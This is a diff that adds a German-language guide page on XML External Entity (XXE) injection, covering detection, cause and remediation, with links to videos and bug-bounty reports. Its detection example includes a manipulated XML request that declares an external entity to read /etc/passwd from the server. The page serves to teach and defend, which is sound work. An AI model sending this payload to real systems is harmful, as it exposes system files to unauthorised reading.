@@ -1,0 +1,29 @@
+<h2 id="xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</h2>
+<h3 id="erkennung">Erkennung</h3>
+<pre><code>Um <span class="hljs-keyword">eine </span>XML <span class="hljs-keyword">External </span>Entity Sicherheitslücke <span class="hljs-keyword">einfach </span>zu erkennen, sollte ü<span class="hljs-keyword">berprüft </span>werden, ob der XML-Parser <span class="hljs-keyword">externe </span>Entitäten (<span class="hljs-string">"&lt;!ENTITY&gt;"</span>) zulässt.
+</code></pre><h4 id="originaler-xml-request">Originaler XML Request</h4>
+<pre><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">stockCheck</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">productId</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">productId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">storeId</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">storeId</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">stockCheck</span>&gt;</span>
+</code></pre><h4 id="manipulierter-xml-request">Manipulierter XML Request</h4>
+<pre><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE replace [
+&lt;!ENTITY ent SYSTEM "file:///etc/passwd"&gt; ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">stockCheck</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">productId</span>&gt;</span>&amp;ent;<span class="hljs-tag">&lt;/<span class="hljs-name">productId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">storeId</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">storeId</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">stockCheck</span>&gt;</span>
+</code></pre><h3 id="ursache">Ursache</h3>
+<pre><code><span class="hljs-keyword">Eine </span>XML <span class="hljs-keyword">External </span>Entity Injection tritt auf, wenn <span class="hljs-keyword">ein </span>XML-Parser unsicher konfiguriert ist und <span class="hljs-keyword">externe </span>Entitäten (z. <span class="hljs-keyword">B. </span><span class="hljs-string">"&lt;!ENTITY&gt;"</span>) in der XML-Struktur zulässt. <span class="hljs-keyword">Dies </span>ermöglicht Angreifern, <span class="hljs-keyword">schädliche </span>oder unerwünschte <span class="hljs-keyword">externe </span>Ressourcen zu laden oder sensible Daten auszulesen.
+</code></pre><h3 id="behebung">Behebung</h3>
+<pre><code><span class="hljs-keyword">Eigentlich </span>ist es <span class="hljs-keyword">sehr, </span><span class="hljs-keyword">einfach </span>seine Systeme vor XXE Angriffen zu <span class="hljs-keyword">schützen, </span>denn <span class="hljs-keyword">die </span><span class="hljs-keyword">eigenen </span>XML-Parser können so konfiguriert werden, dass &lt;!ENTITY&gt; nicht akzeptiert und verarbeitet wird. Das Problem hierbei ist, dass in vielen Fä<span class="hljs-keyword">llen </span>&lt;!ENTITY&gt; aus <span class="hljs-keyword">einem </span>guten Grund verarbeitet werden. In solchen Fä<span class="hljs-keyword">llen </span>sollte <span class="hljs-keyword">die </span>Dokumentation des <span class="hljs-keyword">eigenen </span>XML-Parsers gut durchgearbeitet werden und lediglich Funktionen <span class="hljs-keyword">bereitstellen, </span><span class="hljs-keyword">die </span><span class="hljs-keyword">eine </span>Daseinsberechtigung haben.
+</code></pre><h3 id="videos">Videos</h3>
+<p><a href="https://www.youtube.com/watch?v=qOt2HrKTyEM">Hacking websites with great demos! (XXE Hacks)</a></p>
+<p><a href="https://www.youtube.com/watch?v=gjm6VHZa_8s">XML External Entities (XXE) Explained</a></p>
+<p><a href="https://www.youtube.com/watch?v=0DQnWalxYb4">How to search for XXE!</a></p>
+<h3 id="reports">Reports</h3>
+<p><a href="https://hackerone.com/reports/347139">https://hackerone.com/reports/347139</a></p>
+<p><a href="https://hackerone.com/reports/762251">https://hackerone.com/reports/762251</a></p>
+<p><a href="https://hackerone.com/reports/500515">https://hackerone.com/reports/500515</a></p>
